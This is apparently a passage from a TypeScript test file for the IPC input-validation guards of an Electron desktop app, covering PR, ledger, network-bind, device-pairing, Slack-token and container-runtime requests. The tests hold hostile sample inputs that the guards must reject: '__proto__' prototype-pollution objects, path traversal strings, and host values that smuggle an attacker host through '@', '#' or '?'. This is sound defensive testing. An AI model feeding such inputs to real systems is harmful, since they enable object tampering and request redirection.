      IpcValidationError,
    );
    expect(() =>
      parseSessionPrRequest({ entityId: 'sess-1', pr: { number: 1, repo: 'p' } }),
    ).toThrow(IpcValidationError);
    expect(() =>
      parseSessionPrRequest({ entityId: 'sess-1', pr, extra: 1 }),
    ).toThrow(IpcValidationError);
    expect(() =>
      parseSessionPrRequest({ entityId: 'sess-1', pr: { ...pr, state: 'open' } }),
    ).toThrow(IpcValidationError);
    expect(() => parseSessionPrRequest({ entityId: '../x', pr })).toThrow(
      IpcValidationError,
    );
  });

  it('refuses a prototype-polluting key', () => {
    expect(() =>
      parseSessionPrRequest(
        JSON.parse(
          '{"entityId":"sess-1","pr":{"number":1,"repo":"p","url":"https://x/1","__proto__":{"x":1}}}',
        ),
      ),
    ).toThrow(IpcValidationError);
  });
});

describe('parseLedgerReadQuery', () => {
  it('accepts an empty query', () => {
    expect(parseLedgerReadQuery({})).toEqual({});
  });

  it('keeps only the fields it knows', () => {
    expect(
      parseLedgerReadQuery({ to: 'sess-a', kind: 'ask', limit: 5, bogus: 'x' }),
    ).toEqual({ to: 'sess-a', kind: 'ask', limit: 5 });
  });

  it('refuses a kind that is not in the vocabulary', () => {
    expect(() => parseLedgerReadQuery({ kind: 'nonsense' })).toThrow();
  });

  it('refuses a non-object', () => {
    expect(() => parseLedgerReadQuery(null)).toThrow();
    expect(() => parseLedgerReadQuery('all')).toThrow();
  });
});

describe('parseLedgerPostBody', () => {
  it('accepts a minimal post', () => {
    expect(parseLedgerPostBody({ kind: 'post', body: 'hi' })).toEqual({
      kind: 'post',
      body: 'hi',
    });
  });

  it('drops a `from` in the body — the header decides who is speaking', () => {
    expect(parseLedgerPostBody({ from: 'someone-else', kind: 'post', body: 'hi' })).toEqual({
      kind: 'post',
      body: 'hi',
    });
  });

  it('refuses a missing body or an unknown kind', () => {
    expect(() => parseLedgerPostBody({ kind: 'post' })).toThrow();
    expect(() => parseLedgerPostBody({ kind: 'nonsense', body: 'hi' })).toThrow();
  });

  /**
   * `meta` is written to disk verbatim by `ledger/index.ts` — a `__proto__`
   * own key surviving this guard would survive to persistence, not just to
   * one process's `Object.prototype`. `JSON.parse` is what produces the own
   * property, the same trick `parseSessionPrRequest`'s equivalent test uses.
   */
  it('refuses a forbidden key in meta rather than persisting it', () => {
    expect(() =>
      parseLedgerPostBody(
        JSON.parse('{"kind":"post","body":"hi","meta":{"__proto__":{"x":1}}}'),
      ),
    ).toThrow();
  });
});

describe('parseLedgerAnswerRequest', () => {
  it('accepts a thread and a body', () => {
    expect(parseLedgerAnswerRequest({ thread: 'a1', body: 'yes' })).toEqual({
      thread: 'a1',
      body: 'yes',
    });
  });

  it('refuses a missing thread', () => {
    expect(() => parseLedgerAnswerRequest({ body: 'yes' })).toThrow();
  });
});

/**
 * The container host alias (HIVE-131).
 *
 * Not `assertJiraSite`'s rule, which demands two or more labels: a single-label
 * host on a custom bridge and a literal IP are both legitimate here. A `:` is
 * refused because the port belongs to the receiver — `host.docker.internal:1234`
 * would otherwise become `http://host.docker.internal:1234:63999/hook`.
 */
describe('parseSetReceiverRequest (HIVE-131)', () => {
  it('accepts a hostname', () => {
    expect(
      parseSetReceiverRequest({ hostAlias: 'host.containers.internal' }),
    ).toEqual({ hostAlias: 'host.containers.internal' });
  });

  it('trims surrounding whitespace', () => {
    expect(parseSetReceiverRequest({ hostAlias: '  alias  ' })).toEqual({
      hostAlias: 'alias',
    });
  });

  it('accepts a single label and a literal IP', () => {
    expect(parseSetReceiverRequest({ hostAlias: 'gateway' })).toEqual({
      hostAlias: 'gateway',
    });
    expect(parseSetReceiverRequest({ hostAlias: '192.168.4.125' })).toEqual({
      hostAlias: '192.168.4.125',
    });
  });

  /**
   * `?`, `#`, `@` and `\` each end the URL authority, so an alias carrying one
   * redirects the address instead of naming a host — `10.0.0.5?` yields
   * `http://10.0.0.5?:63999/hook`, which is port 80 of `10.0.0.5`. That is why
   * the rule is an allowlist of hostname characters rather than a blocklist of
   * the delimiters someone happened to think of.
   */
  it.each([
    ['a port', 'a:1234'],
    ['a scheme', 'http://a'],
    ['a path', 'a/b'],
    ['whitespace inside', 'a b'],
    ['empty', ''],
    ['only whitespace', '   '],
    ['a non-string', 7],
    ['a query delimiter', '10.0.0.5?'],
    ['a fragment delimiter', 'evil.com#'],
    ['credentials', 'user@evil.com'],
    ['a backslash', 'evil.com\\x'],
    ['an empty label', 'a..b'],
    ['a trailing dot', 'a.'],
    ['a leading hyphen', '-a'],
    ['over 253 characters', 'a'.repeat(254)],
  ])('rejects %s', (_label, hostAlias) => {
    expect(() => parseSetReceiverRequest({ hostAlias })).toThrow();
  });

  /**
   * The reader and this guard share one predicate (`isHostAlias`), so the set of
   * values the file accepts and the set this channel accepts cannot drift. An
   * earlier pair of separate spellings disagreed on the length bound.
   */
  it('agrees with the file reader on the length bound', () => {
    const at253 = `${'a'.repeat(250)}.io`;
    expect(at253).toHaveLength(253);
    expect(parseSetReceiverRequest({ hostAlias: at253 })).toEqual({
      hostAlias: at253,
    });

    const at254 = `${'a'.repeat(251)}.io`;
    expect(at254).toHaveLength(254);
    expect(() => parseSetReceiverRequest({ hostAlias: at254 })).toThrow();
  });

  /*
    `bind` is a legal key from HIVE-134 on, so an empty block is not an unknown
    key any more — it is a value that itself carries nothing, and falls into
    the same "nothing to change" bucket as an entirely empty payload.
  */
  it('treats an empty bind block as nothing to change', () => {
    expect(() => parseSetReceiverRequest({ bind: {} })).toThrow(/nothing to change/);
  });

  it('rejects a request that changes nothing', () => {
    expect(() => parseSetReceiverRequest({})).toThrow(/nothing to change/);
  });
});

describe('parseSetReceiverRequest and the bind (HIVE-134)', () => {
  it('accepts a full bind', () => {
    expect(
      parseSetReceiverRequest({
        bind: { host: '172.17.0.1', port: 63999, allowedOrigins: ['http://localhost:5173'] },
      }),
    ).toEqual({
      bind: { host: '172.17.0.1', port: 63999, allowedOrigins: ['http://localhost:5173'] },
    });
  });

  it('accepts one field of it, so Settings can write a field at a time', () => {
    expect(parseSetReceiverRequest({ bind: { host: '127.0.0.1' } })).toEqual({
      bind: { host: '127.0.0.1' },
    });
  });

  it('still accepts an alias alone, and both together', () => {
    expect(parseSetReceiverRequest({ hostAlias: 'host.containers.internal' })).toEqual({
      hostAlias: 'host.containers.internal',
    });
    expect(parseSetReceiverRequest({ hostAlias: 'gateway', bind: { port: 0 } })).toEqual({
      hostAlias: 'gateway',
      bind: { port: 0 },
    });
  });

  /*
    The authority-terminating delimiters `isHostAlias` was rewritten to refuse.
    A bind host names a socket rather than a URL authority, but it is validated
    by the same predicate, so the same set has to bounce here.
  */
  it('refuses a bind host that is not a hostname', () => {
    for (const host of ['10.0.0.5?', 'evil.com/x', '10.0.0.5:80', 'a b', '', '::1']) {
      expect(() => parseSetReceiverRequest({ bind: { host } })).toThrow(/setReceiver\.bind\.host/);
    }
  });

  it('refuses a port that is not one', () => {
    for (const port of [-1, 70_000, 1.5, '8080', null]) {
      expect(() => parseSetReceiverRequest({ bind: { port } })).toThrow(/setReceiver\.bind\.port/);
    }
  });

  it('refuses an origin that is not one, naming the entry', () => {
    expect(() =>
      parseSetReceiverRequest({ bind: { allowedOrigins: ['http://ok.test', 'nope'] } }),
    ).toThrow(/setReceiver\.bind\.allowedOrigins\[1\]/);
  });

  it('refuses an allowedOrigins that is not an array', () => {
    expect(() =>
      parseSetReceiverRequest({ bind: { allowedOrigins: 'http://ok.test' } }),
    ).toThrow(/setReceiver\.bind\.allowedOrigins/);
  });

  /* `assertShape`'s rule: an unlisted key means the two sides disagree. */
  it('refuses an unexpected key at either level', () => {
    expect(() => parseSetReceiverRequest({ nope: 1 })).toThrow(/unexpected key/);
    expect(() => parseSetReceiverRequest({ bind: { enabled: true } })).toThrow(/unexpected key/);
  });

  it('refuses a forbidden key inside bind', () => {
    expect(() =>
      parseSetReceiverRequest(JSON.parse('{"bind":{"__proto__":{"host":"evil"}}}')),
    ).toThrow(/forbidden key/);
  });

  it('refuses a bind that is not an object', () => {
    expect(() => parseSetReceiverRequest({ bind: '172.17.0.1' })).toThrow(/setReceiver\.bind/);
  });
});

/**
 * Server mode: on/off and its bind (HIVE-142).
 *
 * Shaped exactly like `parseSetReceiverRequest`'s own two `describe` blocks,
 * because `parseSetServerRequest` is that guard's sibling field for field —
 * see its own doc comment for why.
 */
describe('parseSetServerRequest (HIVE-142)', () => {
  it('accepts enabled alone', () => {
    expect(parseSetServerRequest({ enabled: true })).toEqual({ enabled: true });
    expect(parseSetServerRequest({ enabled: false })).toEqual({ enabled: false });
  });

  it('refuses a non-boolean enabled', () => {
    for (const enabled of ['true', 1, null]) {
      expect(() => parseSetServerRequest({ enabled })).toThrow(/setServer\.enabled/);
    }
  });

  it('accepts a full bind', () => {
    expect(
      parseSetServerRequest({
        bind: { host: '100.64.1.2', port: 7433, allowedOrigins: [] },
      }),
    ).toEqual({
      bind: { host: '100.64.1.2', port: 7433, allowedOrigins: [] },
    });
  });

  it('accepts one field of it, so Settings can write a field at a time', () => {
    expect(parseSetServerRequest({ bind: { host: '100.64.1.2' } })).toEqual({
      bind: { host: '100.64.1.2' },
    });
  });

  it('accepts enabled and bind together', () => {
    expect(
      parseSetServerRequest({ enabled: true, bind: { port: 7433 } }),
    ).toEqual({ enabled: true, bind: { port: 7433 } });
  });

  /**
   * The one field `setReceiver`'s bind does not refuse and this one must:
   * `0.0.0.0` is a legal hostname by `isHostAlias`'s own rule, and
   * `isServerBindHost` is the predicate that carves it back out — see its
   * doc comment for why a served machine has nothing to gain from it.
   */
  it('refuses the wildcard bind', () => {
    expect(() => parseSetServerRequest({ bind: { host: '0.0.0.0' } })).toThrow(
      /setServer\.bind\.host/,
    );
  });

  /**
   * HIVE-142 review, I1: `0`, `00`, `0x0` and `000.000.000.000` are all
   * legal hostname shapes by `isHostAlias`'s rule, and all four are spellings
   * of the same wildcard `dns.lookup`/`net.Server.listen` resolve `0.0.0.0`
   * to — not just the one literal string this guard used to refuse.
   */
  it('refuses every numeral spelling of the wildcard bind, not just the literal string', () => {
    for (const host of ['0', '00', '0x0', '0X0', '000.000.000.000']) {
      expect(() => parseSetServerRequest({ bind: { host } })).toThrow(
        /setServer\.bind\.host/,
      );
    }
  });

  it('refuses a bind host that is not a hostname', () => {
    for (const host of ['10.0.0.5?', 'evil.com/x', '10.0.0.5:80', 'a b', '']) {
      expect(() => parseSetServerRequest({ bind: { host } })).toThrow(
        /setServer\.bind\.host/,
      );
    }
  });

  it('refuses a port that is not one', () => {
    for (const port of [-1, 70_000, 1.5, '8080', null]) {
      expect(() => parseSetServerRequest({ bind: { port } })).toThrow(
        /setServer\.bind\.port/,
      );
    }
  });

  /**
   * The one port `setReceiver`'s bind accepts and this one must not
   * (HIVE-142 review, I3): `0` asks the OS for any free port, but a client's
   * config and a LaunchAgent both have to be told `server.bind.port` ahead
   * of time — neither can be handed a number the kernel only picks at boot.
   */
  it('refuses 0, unlike the receiver bind', () => {
    expect(() => parseSetServerRequest({ bind: { port: 0 } })).toThrow(
      /setServer\.bind\.port/,
    );
  });

  it('refuses an origin that is not one, naming the entry', () => {
    expect(() =>
      parseSetServerRequest({ bind: { allowedOrigins: ['http://ok.test', 'nope'] } }),
    ).toThrow(/setServer\.bind\.allowedOrigins\[1\]/);
  });

  it('refuses a devices key — replacing the roster is pairDevice/revokeDevice’s job', () => {
    expect(() => parseSetServerRequest({ devices: [] })).toThrow(/unexpected key/);
  });

  it('refuses an unexpected key at either level', () => {
    expect(() => parseSetServerRequest({ nope: 1 })).toThrow(/unexpected key/);
    expect(() => parseSetServerRequest({ bind: { enabled: true } })).toThrow(
      /unexpected key/,
    );
  });

  it('refuses a forbidden key inside bind', () => {
    expect(() =>
      parseSetServerRequest(JSON.parse('{"bind":{"__proto__":{"host":"evil"}}}')),
    ).toThrow(/forbidden key/);
  });

  it('treats an empty bind block as nothing to change', () => {
    expect(() => parseSetServerRequest({ bind: {} })).toThrow(/nothing to change/);
  });

  it('rejects a request that changes nothing', () => {
    expect(() => parseSetServerRequest({})).toThrow(/nothing to change/);
  });
});

/**
 * Pairing and revoking a device (HIVE-142).
 *
 * A device name is free text, run through the same `assertText` bound every
 * other pasted string on this bridge takes — not `assertAgentName`'s closed
 * grammar, because "Yunid's MacBook" is a legitimate name and is not lowercase
 * letters, digits and dashes.
 */
describe('parsePairDeviceRequest and parseRevokeDeviceRequest (HIVE-142)', () => {
  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s accepts a free-text name', (_label, parse) => {
    expect(parse({ name: "Yunid's MacBook" })).toEqual({
      name: "Yunid's MacBook",
    });
  });

  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s refuses an empty name', (_label, parse) => {
    expect(() => parse({ name: '' })).toThrow(/must not be empty/);
  });

  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s refuses a non-string name', (_label, parse) => {
    expect(() => parse({ name: 7 })).toThrow();
  });

  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s refuses a control character', (_label, parse) => {
    expect(() => parse({ name: 'ab' })).toThrow(/control characters/);
  });

  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s refuses an unexpected key', (_label, parse) => {
    expect(() => parse({ name: 'a', extra: 1 })).toThrow(/unexpected key/);
  });

  it.each([
    ['pair', parsePairDeviceRequest],
    ['revoke', parseRevokeDeviceRequest],
  ] as const)('%s refuses a missing name', (_label, parse) => {
    expect(() => parse({})).toThrow(/missing key/);
  });
});

/**
 * `config:set-remote` (HIVE-144) — `setServer`'s mirror, and Ruling 3's rule
 * applied to a live payload rather than a hand-edited file: `host` is
 * checked against `isRemoteTarget` only when *this same request's* `mode`
 * names `'remote'`.
 */
/**
 * Fix-round 2: this guard validates shape only — `mode` is an enum, `host` is
 * a string, `port` is in range. The Ruling 3 / `isRemoteTarget` invariant no
 * longer lives here at all; it moved to `setRemote`
 * (`electron/main/config/index.ts`), checked once against the merged result,
 * because a guard that sees one payload can never resolve "effective mode"
 * from that payload alone — see `parseSetRemoteRequest`'s own doc comment and
 * `tests/electron/main/config/remote.test.ts`'s sequence-table coverage of
 * the invariant itself.
 */
describe('parseSetRemoteRequest (HIVE-144)', () => {
  it('accepts mode alone', () => {
    expect(parseSetRemoteRequest({ mode: 'local' })).toEqual({ mode: 'local' });
    expect(parseSetRemoteRequest({ mode: 'remote' })).toEqual({ mode: 'remote' });
  });

  it('refuses a mode that is neither local nor remote', () => {
    expect(() => parseSetRemoteRequest({ mode: 'both' })).toThrow(/setRemote\.mode/);
  });

  /**
   * Ruling 3, the case the ticket calls out by name: every install that has
   * never attached carries `mode: 'local'` alongside `DEFAULT_REMOTE`'s empty
   * `host`, and a payload restating that pair is the ordinary state, not a
   * malformed request.
   */
  it('accepts an empty host when mode is local', () => {
    expect(parseSetRemoteRequest({ mode: 'local', host: '' })).toEqual({
      mode: 'local',
      host: '',
    });
  });

  /**
   * The fix-round-1 refusal (host requires mode in the same payload) is gone
   * as of fix-round 2: it bought nothing once `setRemote` checks the merged
   * result, and a bare `{ host }` while the config is genuinely local is
   * Ruling 3's ordinary case. This guard accepts any well-formed string here,
   * host validity included — `setRemote`'s sequence-table tests are what
   * prove a bad value can never reach disk paired with `mode: 'remote'`.
   */
  it('accepts host without mode — shape only; the invariant is setRemote’s job now', () => {
    expect(parseSetRemoteRequest({ host: '' })).toEqual({ host: '' });
    expect(parseSetRemoteRequest({ host: 'evil.example.com' })).toEqual({
      host: 'evil.example.com',
    });
  });

  it('accepts any well-formed host string alongside mode: remote — value validity is setRemote’s job', () => {
    expect(parseSetRemoteRequest({ mode: 'remote', host: '127.0.0.1' })).toEqual({
      mode: 'remote',
      host: '127.0.0.1',
    });
    expect(
      parseSetRemoteRequest({ mode: 'remote', host: 'evil.example.com' }),
    ).toEqual({ mode: 'remote', host: 'evil.example.com' });
  });

  it('refuses a non-string host', () => {
    expect(() => parseSetRemoteRequest({ host: 7 })).toThrow(/setRemote\.host/);
  });

  it('accepts a port alone', () => {
    expect(parseSetRemoteRequest({ port: 7433 })).toEqual({ port: 7433 });
  });

  it('refuses a port out of range', () => {
    expect(() => parseSetRemoteRequest({ port: 70_000 })).toThrow(/setRemote\.port/);
  });

  it('does not salvage the good fields when one is bad — the whole request fails', () => {
    expect(() =>
      parseSetRemoteRequest({ mode: 'both', host: '127.0.0.1', port: 7433 }),
    ).toThrow(/setRemote\.mode/);
  });

  it('refuses a token key — there is no route for a credential on this channel', () => {
    expect(() => parseSetRemoteRequest({ token: 'secret' })).toThrow(/unexpected key/);
  });

  it('refuses an unexpected key', () => {
    expect(() => parseSetRemoteRequest({ nope: 1 })).toThrow(/unexpected key/);
  });

  it('rejects a request that changes nothing', () => {
    expect(() => parseSetRemoteRequest({})).toThrow(/nothing to change/);
  });
});

/**
 * `remote:pair` (HIVE-144) — the opposite direction from
 * `parsePairDeviceRequest`: this one takes the `deviceId`/`token` pair a
 * `server:pair` mint on some *other* machine handed back, not a free-text
 * name typed by a person.
 */
describe('parseRemotePairRequest (HIVE-144)', () => {
  it('accepts a well-formed pair', () => {
    expect(
      parseRemotePairRequest({ deviceId: 'dev-1', token: 'K7QM-3XTV-9WHZ-2BNP' }),
    ).toEqual({ deviceId: 'dev-1', token: 'K7QM-3XTV-9WHZ-2BNP' });
  });

  it('refuses a malformed deviceId', () => {
    expect(() =>
      parseRemotePairRequest({ deviceId: '../etc', token: 'tok' }),
    ).toThrow(/remotePair\.deviceId/);
  });

  it('refuses an empty token', () => {
    expect(() => parseRemotePairRequest({ deviceId: 'dev-1', token: '' })).toThrow(
      /remotePair\.token/,
    );
  });

  it('refuses a token with non-printable-ASCII content', () => {
    expect(() =>
      parseRemotePairRequest({ deviceId: 'dev-1', token: 'has space' }),
    ).toThrow(/remotePair\.token/);
  });

  it('refuses a missing key', () => {
    expect(() => parseRemotePairRequest({ deviceId: 'dev-1' })).toThrow(/missing key/);
    expect(() => parseRemotePairRequest({ token: 'tok' })).toThrow(/missing key/);
  });

  it('refuses an unexpected key', () => {
    expect(() =>
      parseRemotePairRequest({ deviceId: 'dev-1', token: 'tok', extra: 1 }),
    ).toThrow(/unexpected key/);
  });
});

/**
 * The slack switch and its commander allow-list (HIVE-124).
 */
describe('parseSetSlackRequest (HIVE-124)', () => {
  it('accepts the switch alone', () => {
    expect(parseSetSlackRequest({ socketMode: true })).toEqual({
      socketMode: true,
    });
  });

  it('accepts the allow-list alone, including an empty one', () => {
    expect(parseSetSlackRequest({ commanders: ['U1', 'U2'] })).toEqual({
      commanders: ['U1', 'U2'],
    });
    expect(parseSetSlackRequest({ commanders: [] })).toEqual({
      commanders: [],
    });
  });

  it('accepts both together', () => {
    expect(
      parseSetSlackRequest({ socketMode: false, commanders: ['U1'] }),
    ).toEqual({ socketMode: false, commanders: ['U1'] });
  });

  it('rejects a non-boolean switch', () => {
    expect(() => parseSetSlackRequest({ socketMode: 'true' })).toThrow();
  });

  it('rejects a commanders value that is not an array', () => {
    expect(() => parseSetSlackRequest({ commanders: 'U1' })).toThrow();
  });

  it('rejects a non-string, empty, or whitespace-bearing commander id', () => {
    expect(() => parseSetSlackRequest({ commanders: [7] })).toThrow();
    expect(() => parseSetSlackRequest({ commanders: [''] })).toThrow();
    expect(() => parseSetSlackRequest({ commanders: ['U 1'] })).toThrow();
  });

  it('rejects an unknown key', () => {
    expect(() => parseSetSlackRequest({ token: 'xoxb-1' })).toThrow();
  });

  it('rejects a request that changes nothing', () => {
    expect(() => parseSetSlackRequest({})).toThrow(/nothing to change/);
  });
});

/**
 * The two socket-mode tokens (HIVE-124) — the second payload in the app that
 * carries a secret, and so the second guard whose refusals are worth pinning.
 *
 * `parseSetJiraTokenRequest` is the model, in `guards.jira.test.ts`. The
 * differences from it are the decisions this block exists to hold still: both
 * fields are optional because the pane commits one at a time and main merges;
 * an empty payload is refused rather than read as a clear, because clearing has
 * its own channel and a write that silently erased both is the one mistake a
 * guard can prevent here; and `assertJiraToken`'s bounds are reused, because
 * "printable ASCII, no spaces, bounded" is a statement about credentials in a
 * payload rather than about Jira.
 */
describe('parseSetSlackTokensRequest (HIVE-124)', () => {
  it('accepts either token alone', () => {
    expect(parseSetSlackTokensRequest({ appToken: 'xapp-1-A' })).toEqual({
      appToken: 'xapp-1-A',
    });
    expect(parseSetSlackTokensRequest({ botToken: 'xoxb-2-B' })).toEqual({
      botToken: 'xoxb-2-B',
    });
  });

  it('accepts both together', () => {
    expect(
      parseSetSlackTokensRequest({ appToken: 'xapp-1-A', botToken: 'xoxb-2-B' }),
    ).toEqual({ appToken: 'xapp-1-A', botToken: 'xoxb-2-B' });
  });

  /** Absent is untouched, which is what makes the merge in main safe. */
  it('leaves an absent field off the request entirely', () => {
    expect(parseSetSlackTokensRequest({ appToken: 'xapp-1-A' })).not.toHaveProperty(
      'botToken',
    );
  });

  it('refuses an empty payload rather than reading it as a clear', () => {
    expect(() => parseSetSlackTokensRequest({})).toThrow(/nothing to change/);
  });

  it('refuses an unknown key', () => {
    expect(() =>
      parseSetSlackTokensRequest({ appToken: 'xapp-1-A', socketMode: true }),
    ).toThrow();
  });

  it('refuses an empty, oversized, or whitespace-bearing token', () => {
    expect(() => parseSetSlackTokensRequest({ appToken: '' })).toThrow();
    expect(() =>
      parseSetSlackTokensRequest({ botToken: 'x'.repeat(1025) }),
    ).toThrow();
    expect(() => parseSetSlackTokensRequest({ appToken: 'xapp 1' })).toThrow();
    expect(() => parseSetSlackTokensRequest({ botToken: 'xoxb\n1' })).toThrow();
  });

  it('refuses a non-string', () => {
    expect(() => parseSetSlackTokensRequest({ appToken: 7 })).toThrow();
  });

  /**
   * The prefixes are deliberately not enforced — Slack has renamed token
   * prefixes before, and a guard that refused a valid token would be a bug the
   * user could not work around. A wrong one fails at `auth.test` with Slack's
   * own message, which is the better report.
   */
  it('does not enforce the xapp-/xoxb- prefixes', () => {
    expect(parseSetSlackTokensRequest({ appToken: 'whatever-1' })).toEqual({
      appToken: 'whatever-1',
    });
  });

  /** A refusal that quoted the value would put a token in a log. */
  it('never echoes the value it refused', () => {
    const secret = 'sup3rsecret!'.repeat(200);

    try {
      parseSetSlackTokensRequest({ appToken: secret });
      expect.unreachable('should have refused');
    } catch (cause) {
      expect(String(cause)).not.toContain('sup3rsecret');
    }
  });
});

describe('parseSetProjectRuntimeRequest container', () => {
  const container = {
    workspace: '/workspace',
    hiveDir: '/hive',
    envArg: '-e {name}={value}',
    freshness: 'exec-env',
    hostAlias: 'host.docker.internal',
  };

  it('accepts a full block', () => {
    expect(parseSetProjectRuntimeRequest({ id: 'p', container })).toEqual({
      id: 'p',
      container,
    });
  });

  it('accepts a minimal block and defaults nothing', () => {
    // Absent means inherit. Materialising a default here would freeze today's
    // value into the user's config file.
    const minimal = { workspace: '/workspace', hiveDir: '/hive' };
    expect(parseSetProjectRuntimeRequest({ id: 'p', container: minimal })).toEqual({
      id: 'p',
      container: minimal,
    });
  });

  it('accepts null, which removes the override', () => {
    expect(parseSetProjectRuntimeRequest({ id: 'p', container: null })).toEqual({
      id: 'p',
      container: null,
    });
  });

  it('leaves the block alone when the key is absent', () => {
    expect(parseSetProjectRuntimeRequest({ id: 'p', shell: '/bin/zsh' })).toEqual({
      id: 'p',
      shell: '/bin/zsh',
    });
  });

  // A real command survives, exactly like every other field in the block.
  it('accepts a probe', () => {
    const withProbe = { ...container, probe: 'test -f /workspace/ready' };
    expect(parseSetProjectRuntimeRequest({ id: 'p', container: withProbe })).toEqual({
      id: 'p',
      container: withProbe,
    });
  });

  it.each([
    [{ ...container, workspace: 'relative' }],
    [{ ...container, hiveDir: '' }],
    [{ ...container, envArg: '-e {name}' }],
    [{ ...container, freshness: 'stale' }],
    // The alias names a network destination; the guard is not looser than the reader.
    [{ ...container, hostAlias: 'bad host' }],
    [{ ...container, hostAlias: '10.0.0.5?' }],
    // Whitespace is not a command — the exact case that would have caught a
    // guard that trims where the reader's `isContainerProbe` does not.
    [{ ...container, probe: '   ' }],
    [{ ...container, probe: '' }],
    [{ ...container, probe: 42 }],
    // Not a block at all.
    ['x'],
  ])('refuses %j', (bad) => {
    expect(() => parseSetProjectRuntimeRequest({ id: 'p', container: bad })).toThrow(
      IpcValidationError,
    );
  });

  /**
   * `workspace`/`hiveDir` used to go through `isAbsoluteContainerPath` alone
   * — unbounded length, control characters allowed — while every other
   * string on this bridge is capped (final-review fix, Minor 7). Both end up
   * on a spawned command line via `sessionCommand`'s `PathMap`, so a control
   * character or an absurd length is not merely cosmetic.
   */
  it.each([
    ['workspace', `/${'a'.repeat(4096)}`],
    ['hiveDir', `/${'a'.repeat(4096)}`],
    ['workspace', '/hive\u0007'],
    ['hiveDir', '/hive\u0007'],
  ] as const)('refuses a %s that isAbsoluteContainerPath alone would accept', (key, value) => {
    expect(() =>
      parseSetProjectRuntimeRequest({ id: 'p', container: { ...container, [key]: value } }),
    ).toThrow(IpcValidationError);
  });

  /**
   * `envArg` is the third string on this bridge that reaches a command line,
   * and it was the one left out of Minor 7's fix.
   *
   * `isEnvArgTemplate` only asks that both placeholders are present, so on its
   * own it accepts an unbounded template and one carrying control characters —
   * and unlike a value, a template's own text is emitted **verbatim** by
   * `expandEnvArgs`, never quoted, because it is the runtime's vocabulary
   * rather than user data. `workspace`, `hiveDir` and `probe` all pair their
   * shape check with `assertText` for exactly this reason; this one now does
   * too.
   */
  it.each([
    [`-e {name}={value} ${'x'.repeat(4096)}`],
    ['-e {name}={value}\u0007'],
  ])('refuses an envArg that isEnvArgTemplate alone would accept: %j', (envArg) => {
    expect(() =>
      parseSetProjectRuntimeRequest({ id: 'p', container: { ...container, envArg } }),
    ).toThrow(IpcValidationError);
  });
});

const validTerminal = { sessionId: 'term-01', projectId: 'proj-1', cols: 80, rows: 24 };

describe('parseSpawnTerminalRequest', () => {
  describe('cwd (entry points)', () => {
    it('passes an absolute directory through', () => {
      expect(
        parseSpawnTerminalRequest({ ...validTerminal, cwd: '/repos/x/.claude/worktrees/y' }).cwd,
      ).toBe('/repos/x/.claude/worktrees/y');
    });

    it('is absent when not sent', () => {
      expect(parseSpawnTerminalRequest({ ...validTerminal })).not.toHaveProperty('cwd');
    });

    it('refuses a relative path, an empty one, and control characters', () => {
      expect(() => parseSpawnTerminalRequest({ ...validTerminal, cwd: 'repos/x' })).toThrow(
        /spawn-terminal\.cwd/,
      );
      expect(() => parseSpawnTerminalRequest({ ...validTerminal, cwd: '' })).toThrow(
        /spawn-terminal\.cwd/,
      );
      expect(() => parseSpawnTerminalRequest({ ...validTerminal, cwd: '/repos/x\n' })).toThrow(
        /spawn-terminal\.cwd/,
      );
    });
  });

  it('accepts a well-formed request and returns exactly its four fields', () => {
    expect(parseSpawnTerminalRequest({ ...validTerminal })).toEqual(validTerminal);
    expect(Object.keys(parseSpawnTerminalRequest({ ...validTerminal })).sort()).toEqual([
      'cols',
      'projectId',
      'rows',
      'sessionId',
    ]);
  });

  it('rejects a missing field', () => {
    const { rows: _rows, ...missing } = validTerminal;
    expect(() => parseSpawnTerminalRequest(missing)).toThrow(/missing key "rows"/);
  });

  it('rejects an extra field — a terminal takes no task, model or effort', () => {
    expect(() => parseSpawnTerminalRequest({ ...validTerminal, task: 'x' })).toThrow(
      /unexpected key "task"/,
    );
  });

  it('rejects a prototype-polluting key', () => {
    expect(() =>
      parseSpawnTerminalRequest(JSON.parse('{"sessionId":"t","projectId":"p","cols":1,"rows":1,"__proto__":{}}')),
    ).toThrow(IpcValidationError);
  });

  it('rejects a non-string sessionId', () => {
    expect(() => parseSpawnTerminalRequest({ ...validTerminal, sessionId: 7 })).toThrow(
      /spawn-terminal\.sessionId/,
    );
  });
});

describe('parsePrLookup (HIVE-173)', () => {
  it('accepts owner/name and a positive integer, and nothing else', () => {
    expect(parsePrLookup({ repo: 'acme/nova-web', number: 7 })).toEqual({ repo: 'acme/nova-web', number: 7 });
    expect(parsePrLookup({ repo: 'Acme_1/the.hive', number: 214 })).toEqual({ repo: 'Acme_1/the.hive', number: 214 });

    for (const bad of [
      {},
      { repo: 'nova-web', number: 7 },
      { repo: 'acme/nova/web', number: 7 },
      { repo: 'acme/nova web', number: 7 },
      { repo: 'acme/nova', number: '7' },
      { repo: 'acme/nova', number: 0 },
      { repo: 'acme/nova', number: 1.5 },
      [],
      'acme/nova#7',
    ]) {
      expect(() => parsePrLookup(bad)).toThrow(/pr lookup/);
    }
  });
});
